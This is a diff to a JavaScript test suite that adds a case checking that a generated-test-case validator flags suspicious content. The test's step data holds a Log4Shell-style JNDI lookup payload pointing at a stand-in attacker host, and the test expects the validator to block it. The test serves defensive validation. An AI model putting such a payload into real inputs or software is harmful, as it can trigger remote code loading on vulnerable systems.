@@ -236,6 +236,33 @@ test("redaction tokens in test data are accepted", () => {
   assert.equal(report.blocked, false);
 });
 
+test("semantic suspicious content in exported step data is blocking", () => {
+  const tc = buildCase({
+    steps: [
+      {
+        index: 1,
+        action: "Open payment screen",
+        data: "${jndi:ldap://attacker.example/a}",
+        expected: "Form is visible",
+      },
+    ],
+  });
+  const report = validateGeneratedTestCases({
+    jobId: "job-1",
+    generatedAt: GENERATED_AT,
+    list: buildList([tc]),
+    intent: buildIntent(),
+  });
+  assert.equal(report.blocked, true);
+  assert.ok(
+    report.issues.some(
+      (i) =>
+        i.code === "semantic_suspicious_content" &&
+        i.path === "$.testCases[0].steps[0].data",
+    ),
+  );
+});
+
 test("PII in preconditions is blocking", () => {
   const tc = buildCase({ preconditions: ["Use IBAN DE89370400440532013000"] });
   const report = validateGeneratedTestCases({
